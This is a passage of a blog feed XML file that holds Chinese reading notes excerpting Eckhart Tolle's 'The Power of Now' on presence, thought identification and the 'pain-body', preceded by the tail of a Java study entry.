title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote><p>We are just1 another visitor in a transient world.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记-当下的力量</title>
      <link href="/2024/11/23/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%BD%93%E4%B8%8B%E7%9A%84%E5%8A%9B%E9%87%8F/"/>
      <url>/2024/11/23/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%BD%93%E4%B8%8B%E7%9A%84%E5%8A%9B%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="“活在当下”"><a href="#“活在当下”" class="headerlink" title="“活在当下”"></a>“活在当下”</h1><p>本书 面向开悟 脱离思想与痛苦 将当下作为一切</p><h1 id="正文节选"><a href="#正文节选" class="headerlink" title="正文节选"></a>正文节选</h1><h2 id="第一章-你不等于你的大脑"><a href="#第一章-你不等于你的大脑" class="headerlink" title="第一章 你不等于你的大脑"></a>第一章 你不等于你的大脑</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><blockquote><p>开悟（enlightenment）是什么？</p></blockquote><p>曾经，有个乞丐在路边坐了30多年。一天，一位陌生人经过。这个乞丐机械地举起他的旧棒球帽，喃喃地说：“给点儿吧。”陌生人说：“我没有什么东西可以给你。”然后他问：“你坐着的是什么？”乞丐回答说：“什么都没有，只是一个旧箱子而已，自从我有记忆以来，我就一直坐在它上面。”陌生人问：“你曾经打开过箱子吗？”“没有。”乞丐说，“有什么用？里面什么都没有。”陌生人坚持：“打开箱子看一看。”乞丐这才试着打开箱子。这时令人意想不到的事情发生了，乞丐充满了惊奇与狂喜：箱子里装满了金子。</p><p>我就是那位没有任何东西可给你，却要求你打开箱子看看的陌生人。我不是让你像这则寓言里的乞丐一样看什么箱子，而是叫你往一个更贴近你自身的地方看：你的内在。</p><p>我能清晰地听到你说：“可是，我不是个乞丐呀。”</p><p>那些没有找到他们真正的财富，也就是本体的喜悦以及与它紧密联系在一起的、深刻而不可动摇的宁静的人，就是乞丐，即使他们有很多物质上的财富。他们四处寻找成就、安全感或爱情所残余的欢乐或满足，但是他们不知道自己不仅已经拥有了所有的这些东西，而且还拥有了比这些更为珍贵的东西。</p><p>“开悟”这个词听起来就像一些超人类成就的玄学，但是，它其实就是一种简单的与本体合一的自然状态。它是一种与不可衡量的、不可摧毁的事物相联系的状态。几乎矛盾的是，它其实就是你自己，但又比你更伟大。它找到了超越你名字和形象的真正本质。如果你不能感觉到这种联系，你就会有一种与自己以及与你周围的世界相分离的幻象。你会有意识或无意识地感到自己就像一个孤立的碎片。然后，你内外部的恐惧、冲突和矛盾也随之产生。</p><p>我喜欢佛陀将开悟简单地定义为“受苦的终结”（the end of suffering）。在这个定义里没有超人类观念的存在。当然，作为定义，它是不完整的。它仅告诉你开悟的否定性定义：受苦停止。但是，当没有受苦存在时，还剩下什么呢？佛陀对此沉默不语。他的沉默意味着他自己也没有找到答案。他下了一个否定形式的定义，所以你不会认为开悟是一个超人类的成就或不可达到的目标。尽管这样，绝大部分佛教徒仍然没有体会佛陀的苦心，仍然相信开悟是为佛而准备的，而不属于他们，至少在此生中不属于他们。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><blockquote><p>体验这种现实的最大障碍是什么？</p></blockquote><p>是认同于你的思维，它使人们进行强迫性的思考。不能停止思考是一个可怕的烦恼，由于几乎每一个人都遭受着此种痛苦，而我们又无法意识到这一点，所以这就成了一件很正常的事情。这种不停的思维活动使你无法达到内心的宁静状态。同时，它创造了一个虚假的自我，不断投射出恐惧和苦难的阴影。在下面的章节里我们将详细讨论这个话题。</p><p>哲学家笛卡尔认为，在他写下名言“我思故我在”时，他已经找到了真理。实际上，他表达了一个最基本的错误：将思考视为存在并且认同于思考。强迫性思考者（其实几乎每个人都是）活在一个分裂的状态——一个充满了问题和冲突的疯狂而复杂的世界、一个反映了我们大脑越来越分裂的世界。开悟是一个圆满的境界，合一而和平，与生命以及它所显化的世界合一，同时，与你最深的自我的未显化的生命，也就是本体合一。开悟不仅是痛苦和身心内外冲突的终结，也是思考的终结，这将会是一次不可思议的解放！</p><p>思维认同创造了一连串的概念、标签、意象、词语、判断和定义，阻碍了你所有真正的关系。这些东西挡在你和你自己之间、你和其他人之间、你和自然之间、你和上帝之间。就是这些思维创造了一种孤立的幻象，你与其他人完全分离的幻象。因此，你忘却了一个基本的事实，那就是：在我们肉身表相看来是与众生分离的情形之下，你其实是与万物合一的。当我说“你忘却了”，我指的是你已经无法感受到“合一”这个不证自明的事实。也许你相信它是真的，但是你无法感觉到它是真的了。一个信念也许可以被遗忘，但是，你一定要亲身验证它，它才能真正地解放你自己。</p><p>思维已经变成了一种疾病。当事情失去平衡时，这种疾病就会发生。比如，体内的细胞分裂和繁殖本身没有任何错误，但是当这个过程不顾整个有机体而持续地快速增生时，我们就会得病了。</p><p>注意：如果思维被正确利用的话，它将是一个超强的工具；但如果利用不当，它的危害则相当大。准确地说，不是你利用思维的方式不对——基本上你根本没有利用它，而是它在利用你。这就是一种病态。你认为你就是你的思维、你的大脑，其实这只是种幻觉，这个工具已然控制了你。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我不是很赞同你的说法。虽然像大多数人一样，我常常漫无目的地思考，但是我仍然利用我的大脑完成了许多事情，一直以来我都是这样做的。</span><br></pre></td></tr></table></figure><p>你能解答一个填字谜语或制造一颗原子弹，并不能说明你利用了你的大脑。就像狗喜欢啃骨头一样，大脑喜欢思考问题。这就是为什么它要去玩填字游戏和制造原子弹的原因。你或许对这两个活动都不感兴趣，让我这样问你吧：无论何时，当你想从思维中解放出来的时候，你能做到吗？你找到了停止思考的那个按钮吗？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你是说完全停止思考吗？不，我做不到，一两分钟或许还可以。</span><br></pre></td></tr></table></figure><p>那么，就是你的大脑在利用你了。你无意识地认同了它，所以你甚至不知道自己是它的奴隶。这几乎就像你在毫不知情的情况下被它所俘虏，所以你认为思考问题的这个实体就是你自己。从思维中解放出来的开始就是认识到你不是一个思考问题的实体——思考者。认识到这一点能使你很好地观察这个思考者。在你观察这个思考者时，一个更高层次的意识就被激活了。然后，你会开始意识到有很大的一片超越思想的智性，思想只是这个智性的一个小方面。你同样还会认识到所有真正重要的事情，如美貌、爱情、创造力、欢乐、内在的宁静等，都是来自于大脑之外的。你开始觉醒了。</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>在街道上，你可能会遇到不断喃喃自语的“疯子”。其实他的行为与你和其他“正常人”区别不大，只是你们没有大声说出来而已。那个声音不停地在评论、推测、批判、比较、抱怨、选择好恶等。这种声音可能与你当下所在的情况无关，它可能是关于过去或未来的一些事情，它可能是在回忆往昔，或是在幻想未来可能发生的事情。它经常想象事情可能会出差错，或产生不利的后果，这就是杞人忧天。有时这种声音还会伴随着一些视觉意象或“心理电影”。即使这种声音与现在的情况相关，它也会以过去的形式来解释它，这是因为声音属于你被制约了的大脑，它是你过去的经历以及你继承下来的集体文化思维模式的结果。所以，你以对过去的看法来判断现在的事情，一定会得到一个完全被歪曲的理解。这个声音是人类自己最大的敌人，这是毫不夸张的。许多人在大脑的折磨下度过一生，任由它攻击、惩罚，并耗尽生命的能量。这就是数不清的灾难、痛苦以及疾病产生的原因。</p><p>好消息是你能从你的思维中解放出来。这是唯一的真正的解放。现在，你可以采取第一个步骤了——经常倾听你大脑中的声音。特别关注那些重复性的思维模式，那些多年来缠绕你的“旧唱片”。这就是我说的“观察思考者”的含义，换句话说：倾听你脑袋中的声音并作为一个观察者的临在。</p><p>当你在倾听那种声音时，不要去做任何评判。不要对你所听到的声音做出判断或进行谴责，因为这样做意味着同样的声音又会从后门乘虚而入。你将会很快地认识到：那里有一种声音，而我在这里倾听它，观察它。这是一种自我存在的感觉而不是思维。它超越了你的思维。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>人类一直以来都遭受着痛苦，从他们进入了时间和思维的领域，并丧失了对本体的意识，被痛苦折磨了亿万年；从那时起，他们将自己看成是宇宙中无意义的碎片，断绝了自己和源头及他人之间的联系。</p><p>只要你认同思维，也就是说，只要你处于无意识状态，痛苦就不可避免。在这里我主要指的是情绪上的痛苦，这也是造成身体上的痛苦和疾病的主要原因。怨憎、仇恨、自卑、内疚、愤怒、抑郁、嫉妒等，即使是最为轻微的不快都是痛苦的各种表现。并且，每一次的欢乐或情绪的高涨在其内部都隐含着痛苦的种子：痛苦是这些欢乐的不可分割的对立面，而这个对立面迟早会显化出来。</p><h2 id="第二章-意识：摆脱痛苦的途径"><a href="#第二章-意识：摆脱痛苦的途径" class="headerlink" title="第二章 意识：摆脱痛苦的途径"></a>第二章 意识：摆脱痛苦的途径</h2><h3 id="别在当下制造更多的痛苦"><a href="#别在当下制造更多的痛苦" class="headerlink" title="别在当下制造更多的痛苦"></a>别在当下制造更多的痛苦</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没有人能够完全摆脱痛苦和悲哀。难道我们不应该学会与痛苦共存，而不是去摆脱痛苦吗？</span><br></pre></td></tr></table></figure><p>人类的很大一部分痛苦是没有必要的。只要让未被觉察的思维控制着你的生活，痛苦就会自然而然地产生。</p><p>通常，当下所产生的痛苦都是源自对现状某种形式的不接受、某种形式的无意识抗拒。从思维的层面来说，这种抗拒以批判的形式存在；从情绪的层面来说，它又以负面情绪的形式显现。痛苦的程度取决于你对当下的抗拒程度以及对思维的认同程度。思维通常否认当下，并试图逃离当下。换句话说，你越是认同自己的思维，你就越感到痛苦。或者可以这样说：你越是接受当下，你受的苦就越少，也越能从小我思维中解脱出来。</p><p>为什么思维会习惯性地否认或抗拒当下呢？因为在没有时间（过去和未来）的情况下，它无法发挥自己的作用并对你进行控制，所以它视当下时刻为威胁。实际上，思维和时间是密不可分的。</p><p>想象一下：地球上没有人类，只有动物和植物。这时，仍会有过去和未来的存在吗？这时我们仍然能以任何一种有意义的方式来谈论时间吗？“现在几点？”“今天是几号？”问这种问题将会是毫无意义的，橡树或鹰可能会被问傻了！它们可能会说：“现在几点？现在就是现在啊！除此之外还会有什么呢？”</p><p>是的，在这个世界上我们需要时间和大脑来生活，但是，当它们控制了我们的生活时，痛苦和悲哀就产生了。</p><p>为了维持控制，思维不断地利用过去和未来来掩盖当下时刻，从而与当下密不可分的本体的生命力和无限创造潜力就被时间掩盖了，而你的真实本性也被思维混淆了。人类思维中不断积累的时间负担越来越沉重。所有的人都在这种负担下受苦，但是他们又忽视或否认当下这一宝贵的时刻，或认为当下是实现未来目标的一种手段，而未来其实只存于他们的大脑中，是不现实的——人们就这样不断地增加这种负担。人类集体与个人大脑中积累的时间里，也存在了很多过去的残余痛苦。</p><p>如果你不想再为自己和他人创造痛苦，不想再增加你心中过去的痛苦，那么请你不要再创造时间，或者至少不要创造除了做必要事情之外的时间。如何停止创造时间呢？请你务必认识到，当下时刻是你所拥有的一切，把你的生活重心完全放到当下这一刻，把你先前在时间内流连并短暂地访问当下时刻的做法改为关注当下时刻，只在必要时简单地回顾过去和展望未来。永远对当下说“是”。有什么比对已然存在的东西进行内在的抗拒更徒劳、更疯狂的吗？有什么比反对生命本身，也就是当下，而且永远是当下，更疯狂的吗？向“是”臣服，对生活说“是的”，看看生活是如何为你服务而不是与你为敌的。</p><p>观察大脑是如何为当下时刻贴上标签以及这个贴标签的过程（也就是不断地批判）是如何创造了痛苦和不幸。通过观察思维的活动，你就能够摆脱抗拒的模式，然后还可以允许当下时刻的存在。这将会使你体验到不为外境所困的内心自由，一种真正的内心的宁静状态。然后，再观察发生了什么事情，并采取必要的或可能的行动。</p><p>接纳，然后采取行动。不管当下时刻的情况怎样，心甘情愿地接受它，就像它是你选择的一样。总是与它共事，而不是抗拒它，使它成为你的朋友和盟友而不是敌人。这将会不可思议地改变你的整个生活。</p><h3 id="瓦解你的痛苦之身"><a href="#瓦解你的痛苦之身" class="headerlink" title="瓦解你的痛苦之身"></a>瓦解你的痛苦之身</h3><p>除非你能拥有当下的力量，否则你所体会到的每一个情绪痛苦都会残留一部分，继续在你体内存活。它会与你过去已经存在的痛苦合并，并在你的大脑和身体内扎根。当然，过去的痛苦也包括你孩提时遭受的痛苦，这是因为这个世界的无意识造成的。</p><p>这种积累起来的痛苦是一个消极的能量场，占据着你的大脑和身体。如果你将它视为存在于你体内的无形的实体，那你就离真理不远了。它就是你情绪的痛苦之身。痛苦之身有两种存在模式：休眠和活跃。在90%的时间内，它可能在你的体内都是处于休眠状态；但是，对一个极端不快乐的人来说，他的痛苦之身可能会100%地处于活跃状态。有些人可能完全生活在痛苦之身的状态下，而有些人则可能偶尔感受到它，比如失恋或与过去的痛苦、失落、身体或情感上的伤害等相关联的情况。任何事情都有可能引发痛苦之身，尤其是当它与你过去的痛苦产生共鸣时。当痛苦之身即将从休眠状态中被激活时，即使是一个念头或与你关系亲密的人的一句不经意的话，都有可能激活它。</p><p>有些痛苦之身像个吵闹不休的孩子，虽然令人不愉快，但是它的害处相对较小；而有些痛苦之身则非常邪恶，像具有毁灭性的怪兽，或是像恶魔一般。有些会引起身体上的不适，更多的则是引起情感上的不安。有些会攻击你周围与你亲密的人，而有些则会攻击你自己。然后，你有关生活的想法和感情会变得消极并具有自我毁灭性。疾病和意外往往就是这样产生的。有些痛苦之身甚至会驱使遭受它折磨的人去自杀。</p><p>你本以为你了解某人，但某天你突然碰到的他却变成了一个陌生的、狰狞的野兽，这会让你感到非常吃惊。然而，这时关注自己的内在比关注对方来得更重要。观察你内心任何痛苦的迹象，它的表现形式可能是：愤怒、烦躁、忧郁、伤害他人的欲望、生气、沮丧、想在个人关系中制造冲突的冲动等。在它刚从休眠状态被激活的那一刻，你就应该注意到它。</p><p>痛苦之身要在你的体内生存，就像其他任何一个实体一样，如果你无意识地被它控制，它就能存活下来。然后，它会控制你，变成你，并经由你而活出它自己。它需要从你的体内获取“食物”。它以任何与它能量共振的经历或各种形式创造的痛苦为“食”，这些形式有愤怒、沮丧、恨、哀怨、感情冲突、暴力，甚至是疾病。当它控制你时，它会在你的生活中创造一种经常能激活它能量的情况，以便它继续生存。痛苦只能以痛苦为食，它不能享用欢乐。欢乐对它而言是难以下咽的。</p><p>一旦你被痛苦所控制，你会想要更多的痛苦。这时你会成为受害者或者迫害者：你要么为别人制造更多的痛苦，要么受痛苦的折磨，或者两者皆是。实际上这两者没什么太大的区别。当然，你不会意识到这点，你可能还会说你不要遭受痛苦。但是，如果你仔细观察的话，你会发现自己的思想和行为都在不断地使自己和别人更加痛苦。如果你真正意识到了这一点，这种思维和行为模式就可能会消失。</p><p>痛苦之身其实是小我投射出来的阴影，它很害怕你的意识之光。因为一个正常的人是不想受更多的苦的，除非他病了。痛苦之身害怕被你发现。它的生存取决于你对它无意识的认同，以及你面对内在痛苦时，那种无意识的害怕。但是，如果你不面对痛苦，不努力把意识之光带进痛苦中，你将会被迫一次又一次地激活你的痛苦之身。痛苦之身对于你来说就像一个危险的怪物，你甚至不敢直视它。但是我可以肯定地说，它只是一个幻觉，它在你临在的力量下没法存活。</p><p>很多心灵导师说，所有的痛苦实际上都是一种幻觉，这是真的。问题是：对你来说，这是真的吗？你单凭这样的信念并不会让你从痛苦中解脱。你愿意在你的余生都遭受这种痛苦，然后还坚持说它只是一个幻觉吗？那样你就可以远离痛苦吗？在这里我们所关注的是，你要如何实践这个真理——也就是说，如何让痛苦在你自己的生活中消失。</p><p>所以，痛苦之身不希望你直接去观察它并认清它。当你观察它，感觉到它在你体内的能量场并关注它时，那种无意识的认同就已经被打破了。这时，一种更高的意识状态产生了，我称它为“临在”（presence）。现在你是这个痛苦之身的见证人或观察者。也就是说，它不会再控制你、假装是你，或在你的体内获取新生的能量了。你已经发现了你自己内在的强大力量，你已经获取了当下的力量。</p><p>无意识创造了它，意识将它变回原形。圣保罗优美地说出了宇宙的原理：“万物在光明下无所遁形，同时万物在光的照耀下都会转化成光。”就像你不能向黑暗宣战一样，你不能向痛苦之身宣战，这样做只会引发内心的冲突并创造更深的痛苦。所以观察它就足够了。观察它意味着接纳它成为当下时刻事实的一部分。</p><p>痛苦之身由受困的生命能量构成，这种能量是从你总的生命能量中分离出来的，它通过思维认同的反自然过程暂时地取得自治权。它变得反对生命，就像动物试图去追自己的尾巴一样。你知道我们的文明为什么已经变成了一种自残的文明吗？但是即使自残的力量也仍然是生命的能量。</p><p>当你开始不再认同痛苦之身，而成为观察者时，痛苦之身还会继续挣扎一段时间，同时还会试图让你再度认同它。虽然你不再通过认同它而给它能量，但是它还是会保持一定的动能，就像转动的轮子一样，即使你不再推它，它也会因为惯性继续转动一会儿。在这个阶段，它可能还会在你身体的不同部位制造一些疼痛或不适，但是这些痛苦不会持续很久。请保持临在状态，对痛苦保持关注，守卫你的内在空间。你需要充分地保持注意力，才能直接地观察痛苦之身并感受它的力量。这样，它就无法再控制你的思维了。当你的思维被痛苦所控制时，你就会再次与它认同，而痛苦之身就会再次通过你的思维获得生存。</p><p>比如说，如果愤怒一直左右着你的思维，你不停地在想别人对你做的事，或你将要对别人做的事，这时你就无意识地被痛苦所控制了，痛苦之身又成为了“你”。在有愤怒的地方，通常就有痛苦埋伏在其下。或者，当你心情不好时，你开始有了很多消极的思想，并不断地想你的生活是多么糟糕，这时你的想法就和痛苦之身结合，你就会无意识地被痛苦所控制，也很容易遭受痛苦之身的攻击。此处我所说的“无意识”，是指对某个思想或情绪模式的认同，它隐含的意思是：观察者的完全缺席。</p><p>持久而有意识的关注切断了痛苦之身和思维之间的桥梁，它会带来转化。也就是说，痛苦成为你意识火焰的燃料，结果是意识之火燃烧得更加猛烈。这就是古代炼金术的深奥意义：将金属变成金子，将痛苦转化成意识。内部的分裂被治愈，你又成为圆满的。这样，你接下来要做的就是不再创造更多的痛苦。</p><p>我来总结一下这个过程：将注意力集中在你内心的感受上，了解到这就是痛苦之身并接受它的存在；别去想它，别让你的感受变成大脑和思维，不要去判断或分析它，别在其中寻找你自己的身份认同；保持临在，继续观察你的内在；不仅要觉知到你情绪上的痛苦，更要觉察那个沉默的观察者。这就是当下的力量，这就是你自己有意识的那种临在的力量。然后，请看看接下来会发生什么事情。</p><h3 id="小我对痛苦之身的认同"><a href="#小我对痛苦之身的认同" class="headerlink" title="小我对痛苦之身的认同"></a>小我对痛苦之身的认同</h3><p>我刚刚描述的这个过程非常有力，也非常简单。孩子也可以学习这个过程，希望有一天这将成为孩子在学校里所学到的第一件事。一旦你理解了这个原则或可以对比一下你内心所发生的事情，成为一个临在的观察者，并且实际地去验证它，你将会拥有最强有力的摆脱痛苦的转化工具。</p><p>我们并不否认，当你不再认同你的痛苦之身时，你会遭受强烈的内在抗拒，特别是如果你大半生都强烈地与你的痛苦之身认同，并且从中汲取自我感的话，就更是如此。也就是说你从你的痛苦中创造了一个不幸的自我，并且认为这个由大脑创造的幻觉就是你。在这种情况下，害怕失去自我认同的无意识恐惧，会强烈地抗拒任何摆脱这个思维认同的努力。换句话说，你可能宁愿在痛苦中，与痛苦之身认同，也不愿冒风险去丢失你熟悉的不幸自我而跃入一个未知之中。</p><p>如果你所遇到的就是这种情况，请观察你内心的这种抗拒，并观察你对痛苦的执着。一定要非常警觉。请观察你从痛苦中获取的兴奋快感，观察你想谈论它或是琢磨它的冲动。如果你对此有觉知的话，这种抗拒将会停止。这时，你可以关注一下痛苦之身，作为一个临在的见证者，并致力于它的转化。</p><p>只有你自己可以做这种事情，没有人可以替代你。如果你足够幸运能与意识很强的人在一起，并与他们一起感受临在的状态，这将会对你很有帮助。在这种方式下，你自己的意识之光会增强。如果我们把一块刚刚燃烧的木材放在另一块燃烧猛烈的木材旁边时，过一会儿即使它们分开，第一块木材也会燃烧得更强烈。毕竟，火是相同的。心灵导师就充当了这种火的功用。有些超越了大脑层次而能创造并维持一种强烈意识临在的治疗师，也可以起到这样的作用。</p><h2 id="第三章-深深地进入当下"><a href="#第三章-深深地进入当下" class="headerlink" title="第三章 深深地进入当下"></a>第三章 深深地进入当下</h2><h3 id="别在思维中寻找你自己"><a href="#别在思维中寻找你自己" class="headerlink" title="别在思维中寻找你自己"></a>别在思维中寻找你自己</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在我开悟或变得完全有意识之前，我觉得我仍然需要更多地了解大脑工作的方式。</span><br></pre></td></tr></table></figure><p>不，你不需要。有关大脑的问题不能在大脑的层面中得到解决。一旦当你理解了基本的思维障碍后，你就没必要再了解或理解太多。对大脑复杂性的研究会使你成为一个很好的心理学家，但是它不会使你超越大脑，就像研究疯狂不足以创造理智一样。你已经理解了无意识状态的基本原理：思维认同。它创造了一个虚假的自我，也就是小我，而这个虚假的自我替代了你真正的自我。你真正的自我是根植于本体之中的。如耶稣所说：“你变成了从葡萄藤上砍下来的一根枝蔓。”</p><p>小我的需求是无止境的。它感到自己很脆弱，容易受到威胁，所以它一直生活在一种恐惧和缺乏的状态中。一旦你了解了这一点，你就不需要探索它所有的表现形式，也没必要将它转化成复杂的个人问题。当然，小我喜欢你这样做。它通常会寻找一种依托以便加强支持它虚幻的自我感，并且总是将自己和你的问题联系在一起。对于大部分人来说，这就是他们的自我感觉与他们的问题紧密联系在一起的原因。一旦这种情形发生了，他们最不愿做的一件事就是从他们的问题中解脱出来，因为这意味着自我感的丧失。所以，小我喜欢你无意识地大量投资在痛苦和苦难中。</p><p>因此，一旦你认识到无意识的根本原因是思维认同（当然还包括情感认同），你就可以逐步走出这个阴影了。你可以进入当下，这时，你就会允许思维的存在而不陷入思维之中。大脑本身是没有什么问题的，它是一个很好的工具。但是如果你从大脑思维中寻找你自己并误认为它就是你，那它就会变成一种小我的思维，并且控制你的整个生活。</p><h3 id="任何事物都不能存在于当下时刻之外"><a href="#任何事物都不能存在于当下时刻之外" class="headerlink" title="任何事物都不能存在于当下时刻之外"></a>任何事物都不能存在于当下时刻之外</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过去和未来难道不真实吗？它们有时看起来比当下更为真实。毕竟，过去决定了我们是谁以及我们现在的思维和行为，并且我们未来的目标决定了我们现在该采取的行动。</span><br></pre></td></tr></table></figure><p>你还没有把握我所说的内容的实质，因为你在试着用大脑去理解它。大脑是不会理解的。只有你能，请专心地听就好。</p><p>你可曾在当下之外体验过、做过、思考过或感觉过什么东西？你认为你做得到吗？有什么事情能发生或者存在于当下之外吗？答案很明显，不能。</p><p>没有任何事情可以发生在过去，所有的事情都发生在当下。</p><p>也没有任何事情会发生在未来，所有的事情都只发生在当下。</p><p>过去发生的事情是一个记忆的痕迹，它储存在大脑中，是过去的当下。当你记起过去发生的事情时，你就重新激活了那个记忆——而你是在当下做这件事情的。未来是一个幻象的当下，是思维对未来的投射。当未来来临时，它是以当下的方式到来。当你思考未来时，你也是在当下做这件事情。很明显，过去和未来本身没有现实性。就像月亮本身不会发光一样，它只能反射太阳光，所以过去和未来仅是永恒的当下的光线、力量和现实性的反映。过去和未来的现实性都是从当下借过来的。</p><p>我在这里所说的内容的本质通过大脑是不可能被理解的。但在你理解它的那一刻，你的意识就会从思维转变到本体，从时间转变到临在。突然，每件事都会充满活力，散发出本体的能量。</p><h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p>所有的消极心态都是由积累了心理时间以及对当下时刻的拒绝所引起的。焦虑、紧张、不安、压力、烦恼——所有形式的恐惧，都是因为对未来过于关注而对当下关注不够所引起的。愧疚、后悔、悲伤、怨恨、痛苦以及所有形式的不宽恕都是由过于关注过去而很少关注当下时刻引起的。</p><p>大部分人很难相信人可以完全从所有的消极心态中解放出来，然而这正是所有的灵性教材所指出的解脱状态。这种状态不是在虚幻的未来，而是在此时此地。</p><p>你可能很难认识到时间是造成你的痛苦和问题的原因，你认为痛苦和问题是由你生活中的一些特殊情况引起的。从传统的观念来看，这是对的。但是，除非你解决了大脑不断制造麻烦的功能失调问题，也就是它执意于未来而拒绝当下的问题，否则所有的麻烦都会换汤不换药地重复出现。如果造成你所有问题、痛苦、不幸的原因都在今天奇迹般地消失，但是你还是没有变得更为临在、更有意识，那你很快就会发现相同的问题或痛苦的原因又会如影随形般地出现在你身边。最终，问题只有一个：被时间所限的思维本身。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我无法相信，我有朝一日能从我的问题中完全地释放出来。</span><br></pre></td></tr></table></figure><p>你是对的。你永远无法“达到”这种状态，因为你“已经”在那个时间点上了。那就是：现在！</p><p>在时间中没有救赎。你无法在未来被释放，当下时刻才是你获取自由的关键，所以你只有在当下才能解脱。</p><h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p>如果你正在做的事情无法让你感受到喜悦、自在和轻松，这并不意味着你需要改变你正在做的事情，你需要改变的是你做事的方式。如何做事通常比做什么事更为重要。试试看，如果你将注意力更多地放在你正在做的事情上，而不是放在通过做这件事所取得的结果上，会发生什么情况。请将你的注意力全部集中在当下所发生的情况上。这意味着你同样完全接受当下时刻的事实，因为你不可能在完全关注某事的同时又去抗拒它。</p><p>只要关注当下时刻，你所有的不快乐和挣扎将会消失，你的生活也会充满喜悦和安逸。只要你以当下的觉知来采取行动，无论你做什么，它都会充满美德、关怀和爱——即使是一个最为简单的行动。</p><p>所以请不要担心你行动的结果——仅仅关注行动本身就好了。行动的结果会自然而然地产生。这是一个非常有效的灵修方法。现存最古老、最优美的灵性教导《薄伽梵歌》（Bhagavad Gita），将对行动结果的不执着称为业力瑜伽（Karma Yoga）。它也被描述成“神圣的行动”。</p><p>当你不再迫切地想逃离当下，本体的喜悦就会进入你所做的每一件事情之中。当你的注意力转向当下的那一刻，你会感觉到临在、宁静和平和。你不会再为了成就和满足而依赖未来——你不再将未来视为救赎。因此，你将不执着于结果。失败或成功都不会改变你本体的内在状态。你已经发现了生活情境之下的生命了。</p><p>在没有心理时间的情况下，你的自我感源于本体而不是你的过去。在这个世界上，在你的生活情境层面，你可能会变得很富有，知识很丰富，很成功，很自由，但是在更深的本体状态里，你是圆满和完整的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在这种圆满的状态中，我们是否仍然还能或愿意追求外在的目标？</span><br></pre></td></tr></table></figure><p>当然可以，但是你将不会去幻想未来有任何事情或任何人将会拯救你或使你开心。就你的生活情境而言，你可能还是需要得到或要求一些东西，因为这是一个有形有相的、有得有失的世界。而在更深的层次里，你已经是一个完整的人了。当你能意识到这点时，在你所做的事情里将会有欢乐的能量。从心理时间中解放出来后，你将不再受恐惧、愤怒、不满等的驱动而去追求你的目标，也不会因面对失败的恐惧而变得消极。</p><p>当你更深的自我感是来自本体，而你也从心理需求的上瘾症中走出来时，无论是你的快乐或自我感都不取决于事情的结果，因此你可以说是从恐惧中解脱了！你不会在一个无常的世界中追求永恒，因为它是一个有形有相的、有得有失、有生有死的世界。你不会要求情境、状况、地点或人物让你快乐，然后如果它们未能达到你的要求你就痛苦。</p><p>尊重每一件事，却又不在乎这一切。身体形式有生和死，但是你意识到了处于形式之下的永恒的东西。你知道真理是不会受到威胁的。</p><p>当这变为你的存在状态时，你怎会不取得成功呢？你已经成功了。</p><h2 id="第四章-思维逃避当下的策略"><a href="#第四章-思维逃避当下的策略" class="headerlink" title="第四章 思维逃避当下的策略"></a>第四章 思维逃避当下的策略</h2><h3 id="从不快乐中解脱"><a href="#从不快乐中解脱" class="headerlink" title="从不快乐中解脱"></a>从不快乐中解脱</h3><p>你是否怨恨你正在做的事情？它可能是你的工作，或者你已经同意了做这件事，并且你正在做，但是你同时又在怨恨和抗拒这件事。你会默默地怨恨与你亲近的人吗？你是否意识到了你因此而散发出来的能量是非常有害的，它会影响你自己以及你周围的人？请仔细观察你的内在。那里是否有一些轻微的怨恨和不情愿的迹象呢？如果有，请从心理以及情绪两个层面去观察它。关于某种情况，你思维所创造的观点是什么？然后请观察你的情绪，这是你身体对这些观点所做出的反应。请感受一下这些情绪。你觉得开心还是烦恼？这是一个你会选择让它进入你内在的能量吗？你有选择吗？</p><p>也许你被利用了，也许你所参与的活动枯燥无味，也许与你亲近的人不诚实或令人厌烦，但是所有的这些都是无关紧要的。你对于这种情况而产生的思想或情绪是否有理，不会起到任何作用。事实是，你正在抗拒本然。你将当下时刻看成敌人。你在你的内心和外界制造了不快乐和冲突。你的不快乐不仅污染了你的内心世界和你周围人的内心世界，而且还污染了与你不可分割的人类集体的精神。我们这个地球的污染只不过是内心污染的外在投射：上百万个无意识的人没有为他们的内心世界担负起责任。</p><p>停下你正在做的事情，与相关的人谈话，全面地表达你的感受，或者摆脱由你思维所创造的消极观点，因为你的负面思维除了加强你虚假的自我感之外不会有任何好处。承认它的无益处是非常重要的。消极的心态绝对不是处理任何情况的最好方式。实际上，在大多数情况下，它让你陷入它的陷阱并阻止真实的变化。任何在消极能量之下所做的事情都会被它所污染，并且会创造更多的痛苦、更多的不幸。尤有甚之，任何消极的内心状态都是具有传染性的：不快乐比疾病的传播速度更快、更容易。通过共鸣原则，它会在其他人身上引发潜在的消极心态，除非他们具有免疫能力——高度的意识。</p><p>你是在污染这个世界还是在清理废渣呢？你应该对你的内在空间负责，就像你该对这个地球负责一样。你的内在如何，外在就如何。如果